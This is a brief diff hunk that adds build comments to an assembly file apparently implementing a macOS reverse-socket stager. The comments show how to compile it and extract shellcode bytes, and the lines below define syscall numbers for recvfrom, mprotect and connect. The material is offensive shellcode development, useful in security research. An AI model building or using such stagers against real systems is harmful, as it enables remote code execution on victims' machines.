@@ -1,3 +1,5 @@
+// Compile: clang stager_sock_reverse.s
+// Shellcode: objdump -d a.out | cut -d ' ' -f 2-5
 .equ SYS_RECVFROM, 0x200001d
 .equ SYS_MPROTECT, 0x200004a
 .equ SYS_CONNECT, 0x2000062
